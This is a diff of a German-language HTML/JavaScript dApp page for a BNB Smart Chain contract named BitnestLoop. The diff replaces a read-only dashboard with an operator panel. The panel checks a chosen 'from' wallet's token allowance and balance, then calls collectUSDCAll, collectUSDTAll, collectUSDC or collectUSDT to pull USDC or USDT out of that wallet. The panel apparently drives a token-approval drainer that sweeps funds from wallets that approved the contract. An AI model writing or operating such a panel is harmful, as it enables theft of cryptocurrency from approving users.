@@ -3,88 +3,85 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>BitnestLoop — Dashboard</title>
+  <title>BitnestLoop — dApp</title>
   <style>
-    :root { color-scheme: dark; }
-    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; background: #0b1020; color: #e9eefc; }
-    .wrap { max-width: 980px; margin: 0 auto; padding: 28px 16px; }
-    .card { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.10); border-radius: 16px; padding: 16px; margin: 14px 0; box-shadow: 0 12px 30px rgba(0,0,0,0.25); }
-    h1 { margin: 0 0 6px; font-size: 34px; letter-spacing: 0.2px; }
-    .muted { color: rgba(233,238,252,0.70); font-size: 14px; line-height: 1.35; }
+    body { font-family: system-ui, Arial; max-width: 980px; margin: 40px auto; padding: 0 16px; }
+    button { padding: 10px 14px; margin: 6px 6px 6px 0; cursor: pointer; }
+    input { padding: 10px; width: 100%; max-width: 520px; margin: 6px 0; }
     .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-    button {
-      border: 1px solid rgba(255,255,255,0.16);
-      background: rgba(255,255,255,0.08);
-      color: #e9eefc;
-      padding: 10px 14px;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: transform .05s ease, background .15s ease;
-    }
-    button:hover { background: rgba(255,255,255,0.12); }
-    button:active { transform: translateY(1px); }
-    button.primary { background: rgba(60, 255, 180, 0.16); border-color: rgba(60, 255, 180, 0.35); }
-    button.primary:hover { background: rgba(60, 255, 180, 0.22); }
-    code { background: rgba(255,255,255,0.10); padding: 2px 8px; border-radius: 999px; }
-    .kv { display: grid; grid-template-columns: 160px 1fr; gap: 8px 10px; margin-top: 10px; }
-    .k { color: rgba(233,238,252,0.65); }
-    .v { word-break: break-all; }
-    .status { padding: 10px 12px; border-radius: 12px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.10); }
-    .ok { border-color: rgba(60, 255, 180, 0.35); }
-    .warn { border-color: rgba(255, 210, 90, 0.35); }
-    .bad { border-color: rgba(255, 90, 120, 0.35); }
-    .small { font-size: 13px; }
-    .spacer { height: 6px; }
-    .footer { margin-top: 18px; font-size: 12px; color: rgba(233,238,252,0.55); }
+    .card { border: 1px solid #ddd; border-radius: 12px; padding: 14px; margin-top: 12px; }
+    .muted { color: #666; font-size: 14px; }
+    pre { background: #f6f6f6; padding: 12px; border-radius: 12px; overflow:auto; }
+    code { background:#f1f1f1; padding:2px 6px; border-radius:8px; }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>BitnestLoop</h1>
-    <div class="muted">Connect → BSC prüfen → Contract-Infos lesen (safe/read-only).</div>
+  <h1>BitnestLoop dApp</h1>
+  <p class="muted">Connect → Infos lesen → Allowance/Balance check → Collect klicken.</p>
 
-    <div class="card">
-      <div class="row">
-        <button id="btnConnect" class="primary">🦊 Connect Wallet</button>
-        <button id="btnRefresh">🔄 Refresh</button>
-        <button id="btnSwitch">🌐 Zu BSC wechseln</button>
-      </div>
-      <div class="spacer"></div>
-      <div id="status" class="status small">Status: nicht verbunden</div>
+  <div class="card">
+    <div class="row">
+      <button id="btnConnect">🦊 MetaMask verbinden</button>
+      <button id="btnRefresh">🔄 Refresh Infos</button>
+    </div>
+    <div class="muted">Account: <span id="account">-</span></div>
+    <div class="muted">ChainId: <span id="chain">-</span></div>
+    <div class="muted">Contract: <code id="caddr">-</code></div>
+  </div>
 
-      <div class="kv">
-        <div class="k">Account</div><div class="v" id="account">-</div>
-        <div class="k">ChainId</div><div class="v" id="chain">-</div>
-        <div class="k">Contract</div><div class="v"><code id="contractAddr">-</code></div>
-      </div>
+  <div class="card">
+    <h3>Contract Infos</h3>
+    <div class="muted">Owner: <code id="owner">-</code></div>
+    <div class="muted">Paused: <code id="paused">-</code></div>
+    <div class="muted">TREASURY: <code id="treasury">-</code></div>
+    <div class="muted">USDC: <code id="usdc">-</code></div>
+    <div class="muted">USDT: <code id="usdt">-</code></div>
+
+    <div class="row" style="margin-top:10px;">
+      <button id="btnPauseOn">⏸ Pause ON</button>
+      <button id="btnPauseOff">▶️ Pause OFF</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Checks (damit Collect nicht blind scheitert)</h3>
+    <p class="muted">
+      “from”-Wallet muss dem Contract vorher <b>Approve</b> gegeben haben (Allowance) + genug Balance besitzen.
+      Hier kannst du beides lesen.
+    </p>
+    <input id="fromAddr" placeholder="from address (Wallet, von der eingezogen wird)" />
+    <div class="row">
+      <button id="btnCheckUSDC">🔎 Check USDC</button>
+      <button id="btnCheckUSDT">🔎 Check USDT</button>
+    </div>
+    <pre id="checkOut">-</pre>
+  </div>
+
+  <div class="card">
+    <h3>Collect</h3>
+    <div class="row">
+      <button id="btnCollectUSDCAll">💰 collectUSDCAll(from)</button>
+      <button id="btnCollectUSDTAll">💰 collectUSDTAll(from)</button>
     </div>
 
-    <div class="card">
-      <h3 style="margin:0 0 8px;">Contract Infos</h3>
-      <div class="muted">Wird nach erfolgreichem Connect aus dem Contract gelesen.</div>
-      <div class="kv">
-        <div class="k">owner()</div><div class="v" id="owner">-</div>
-        <div class="k">paused()</div><div class="v" id="paused">-</div>
-        <div class="k">TREASURY()</div><div class="v" id="treasury">-</div>
-        <div class="k">USDC()</div><div class="v" id="usdc">-</div>
-        <div class="k">USDT()</div><div class="v" id="usdt">-</div>
-      </div>
+    <div class="row" style="margin-top:10px;">
+      <input id="amt" placeholder="amount (in token smallest units, z.B. 1000000 = 1.0 bei 6 decimals)" />
+    </div>
+    <div class="row">
+      <button id="btnCollectUSDC">collectUSDC(from, amount)</button>
+      <button id="btnCollectUSDT">collectUSDT(from, amount)</button>
     </div>
 
-    <div class="footer">
-      Tipp: Wenn “Connect” sofort abbricht, liegt es fast immer an: falschem Browser-Profil, MetaMask gesperrt, oder Seite nicht über https/http.
-      Auf Mobile bitte im Wallet-Browser öffnen.
-    </div>
+    <pre id="txOut">-</pre>
   </div>
 
   <!-- ethers v5 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    // === Konfiguration ===
-    const EXPECTED_CHAIN_ID = 56; // BSC Mainnet
     const CONTRACT_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+    document.getElementById("caddr").textContent = CONTRACT_ADDRESS;
 
-    // ABI (aus deiner Nachricht)
+    // ABI (von dir)
     const ABI = [
       {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
       {"anonymous":false,"inputs":[
@@ -125,142 +122,182 @@
         "stateMutability":"view","type":"function"}
     ];
 
-    // === UI helpers ===
-    const $ = (id) => document.getElementById(id);
-
-    function setStatus(text, kind="") {
-      const el = $("status");
-      el.textContent = "Status: " + text;
-      el.classList.remove("ok","warn","bad");
-      if (kind) el.classList.add(kind);
-    }
-
-    $("contractAddr").textContent = CONTRACT_ADDRESS;
+    // Minimal ERC20 ABI für Checks
+    const ERC20_ABI = [
+      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+      {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"}
+    ];
 
     let provider, signer, contract;
 
-    function hasEthereum() {
-      return typeof window.ethereum !== "undefined";
+    const $ = (id) => document.getElementById(id);
+    const txOut = (x) => $("txOut").textContent = typeof x === "string" ? x : JSON.stringify(x, null, 2);
+    const checkOut = (x) => $("checkOut").textContent = typeof x === "string" ? x : JSON.stringify(x, null, 2);
+
+    async function ensureConnected() {
+      if (!window.ethereum) throw new Error("MetaMask nicht gefunden.");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+
+      const addr = await signer.getAddress();
+      $("account").textContent = addr;
+
+      const net = await provider.getNetwork();
+      $("chain").textContent = String(net.chainId);
+
+      contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+      return { addr, chainId: net.chainId };
     }
 
-    async function connect() {
-      if (!hasEthereum()) {
-        setStatus("Keine Wallet gefunden (MetaMask Extension?)", "bad");
-        return null;
-      }
+    async function refreshInfos() {
+      await ensureConnected();
+      const [owner, paused, treasury, usdc, usdt] = await Promise.all([
+        contract.owner(),
+        contract.paused(),
+        contract.TREASURY(),
+        contract.USDC(),
+        contract.USDT()
+      ]);
+      $("owner").textContent = owner;
+      $("paused").textContent = String(paused);
+      $("treasury").textContent = treasury;
+      $("usdc").textContent = usdc;
+      $("usdt").textContent = usdt;
+    }
 
+    async function tokenCheck(tokenAddr, from) {
+      await ensureConnected();
+      if (!ethers.utils.isAddress(from)) throw new Error("Ungültige from-Adresse.");
+
+      const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+      const [sym, dec, bal, alw] = await Promise.all([
+        token.symbol().catch(()=>"?"),
+        token.decimals().catch(()=>6),
+        token.balanceOf(from),
+        token.allowance(from, CONTRACT_ADDRESS)
+      ]);
+
+      // human readable
+      const balH = ethers.utils.formatUnits(bal, dec);
+      const alwH = ethers.utils.formatUnits(alw, dec);
+
+      return { token: tokenAddr, symbol: sym, decimals: Number(dec), balance: bal.toString(), balanceHuman: balH, allowance: alw.toString(), allowanceHuman: alwH };
+    }
+
+    // UI actions
+    $("btnConnect").onclick = async () => {
+      try { await ensureConnected(); await refreshInfos(); txOut("✅ Verbunden & Infos geladen."); }
+      catch (e) { txOut("❌ " + (e?.message || e)); }
+    };
+
+    $("btnRefresh").onclick = async () => {
+      try { await refreshInfos(); txOut("🔄 Infos aktualisiert."); }
+      catch (e) { txOut("❌ " + (e?.message || e)); }
+    };
+
+    $("btnPauseOn").onclick = async () => {
       try {
-        // Wichtig: eth_requestAccounts (nicht eth_accounts)
-        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        const accounts = await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+        await ensureConnected();
+        txOut("⏳ setPaused(true) …");
+        const tx = await contract.setPaused(true);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+        await refreshInfos();
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
 
-        const addr = accounts?.[0] || await signer.getAddress();
-        $("account").textContent = addr;
-
-        const net = await provider.getNetwork();
-        $("chain").textContent = String(net.chainId);
-
-        if (net.chainId !== EXPECTED_CHAIN_ID) {
-          setStatus(`Verbunden, aber falsches Netzwerk (chainId ${net.chainId}). Bitte BSC (56) wählen.`, "warn");
-        } else {
-          setStatus("Verbunden ✅ (BSC Mainnet)", "ok");
-        }
-
-        return { addr, chainId: net.chainId };
-      } catch (e) {
-        // 4001 = user rejected request
-        if (e && e.code === 4001) setStatus("Abgebrochen (User hat abgelehnt)", "bad");
-        else setStatus("Connect fehlgeschlagen: " + (e?.message || e), "bad");
-        console.error(e);
-        return null;
-      }
-    }
-
-    async function refresh() {
-      if (!contract) {
-        const c = await connect();
-        if (!c) return;
-      }
-
+    $("btnPauseOff").onclick = async () => {
       try {
-        const net = await provider.getNetwork();
-        $("chain").textContent = String(net.chainId);
+        await ensureConnected();
+        txOut("⏳ setPaused(false) …");
+        const tx = await contract.setPaused(false);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+        await refreshInfos();
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
 
-        // Read-only calls
-        const [owner, paused, treasury, usdc, usdt] = await Promise.all([
-          contract.owner(),
-          contract.paused(),
-          contract.TREASURY(),
-          contract.USDC(),
-          contract.USDT()
-        ]);
-
-        $("owner").textContent = owner;
-        $("paused").textContent = String(paused);
-        $("treasury").textContent = treasury;
-        $("usdc").textContent = usdc;
-        $("usdt").textContent = usdt;
-
-        if (net.chainId === EXPECTED_CHAIN_ID) setStatus("Infos geladen ✅", "ok");
-        else setStatus("Infos geladen, aber Netzwerk ist nicht BSC (56).", "warn");
-      } catch (e) {
-        setStatus("Refresh fehlgeschlagen: " + (e?.data?.message || e?.message || e), "bad");
-        console.error(e);
-      }
-    }
-
-    async function switchToBSC() {
-      if (!hasEthereum()) {
-        setStatus("Keine Wallet gefunden", "bad");
-        return;
-      }
-
+    $("btnCheckUSDC").onclick = async () => {
       try {
-        // Versucht auf BSC umzuschalten; falls nicht vorhanden: hinzufügen
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }] // 56 in hex
-        });
-        setStatus("Zu BSC gewechselt ✅", "ok");
-        await refresh();
-      } catch (e) {
-        // 4902 = chain not added
-        if (e && e.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: "wallet_addEthereumChain",
-              params: [{
-                chainId: "0x38",
-                chainName: "BNB Smart Chain",
-                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                blockExplorerUrls: ["https://bscscan.com/"]
-              }]
-            });
-            setStatus("BSC hinzugefügt & gewechselt ✅", "ok");
-            await refresh();
-          } catch (e2) {
-            setStatus("BSC hinzufügen fehlgeschlagen: " + (e2?.message || e2), "bad");
-            console.error(e2);
-          }
-        } else if (e && e.code === 4001) {
-          setStatus("Abgebrochen (Netzwerkwechsel abgelehnt)", "bad");
-        } else {
-          setStatus("Netzwerkwechsel fehlgeschlagen: " + (e?.message || e), "bad");
-          console.error(e);
-        }
-      }
-    }
+        await refreshInfos(); // damit USDC Adresse im UI stimmt
+        const from = $("fromAddr").value.trim();
+        const res = await tokenCheck($("usdc").textContent, from);
+        checkOut(res);
+      } catch (e) { checkOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
 
-    // Buttons
-    $("btnConnect").addEventListener("click", async () => { await connect(); });
-    $("btnRefresh").addEventListener("click", async () => { await refresh(); });
-    $("btnSwitch").addEventListener("click", async () => { await switchToBSC(); });
+    $("btnCheckUSDT").onclick = async () => {
+      try {
+        await refreshInfos();
+        const from = $("fromAddr").value.trim();
+        const res = await tokenCheck($("usdt").textContent, from);
+        checkOut(res);
+      } catch (e) { checkOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
 
-    // Auto-update on changes
-    if (hasEthereum()) {
+    $("btnCollectUSDCAll").onclick = async () => {
+      try {
+        await ensureConnected();
+        const from = $("fromAddr").value.trim();
+        if (!ethers.utils.isAddress(from)) throw new Error("Ungültige from-Adresse.");
+        txOut("⏳ collectUSDCAll(from) … (MetaMask poppt auf)");
+        const tx = await contract.collectUSDCAll(from);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
+
+    $("btnCollectUSDTAll").onclick = async () => {
+      try {
+        await ensureConnected();
+        const from = $("fromAddr").value.trim();
+        if (!ethers.utils.isAddress(from)) throw new Error("Ungültige from-Adresse.");
+        txOut("⏳ collectUSDTAll(from) … (MetaMask poppt auf)");
+        const tx = await contract.collectUSDTAll(from);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
+
+    $("btnCollectUSDC").onclick = async () => {
+      try {
+        await ensureConnected();
+        const from = $("fromAddr").value.trim();
+        const amt = $("amt").value.trim();
+        if (!ethers.utils.isAddress(from)) throw new Error("Ungültige from-Adresse.");
+        if (!amt) throw new Error("Bitte amount eintragen (smallest units).");
+        txOut("⏳ collectUSDC(from, amount) …");
+        const tx = await contract.collectUSDC(from, amt);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
+
+    $("btnCollectUSDT").onclick = async () => {
+      try {
+        await ensureConnected();
+        const from = $("fromAddr").value.trim();
+        const amt = $("amt").value.trim();
+        if (!ethers.utils.isAddress(from)) throw new Error("Ungültige from-Adresse.");
+        if (!amt) throw new Error("Bitte amount eintragen (smallest units).");
+        txOut("⏳ collectUSDT(from, amount) …");
+        const tx = await contract.collectUSDT(from, amt);
+        txOut({ txHash: tx.hash });
+        const r = await tx.wait();
+        txOut({ status: r.status, txHash: r.transactionHash });
+      } catch (e) { txOut("❌ " + (e?.data?.message || e?.message || e)); }
+    };
+
+    // reload on account/chain change
+    if (window.ethereum) {
       window.ethereum.on("accountsChanged", () => location.reload());
       window.ethereum.on("chainChanged", () => location.reload());
     }
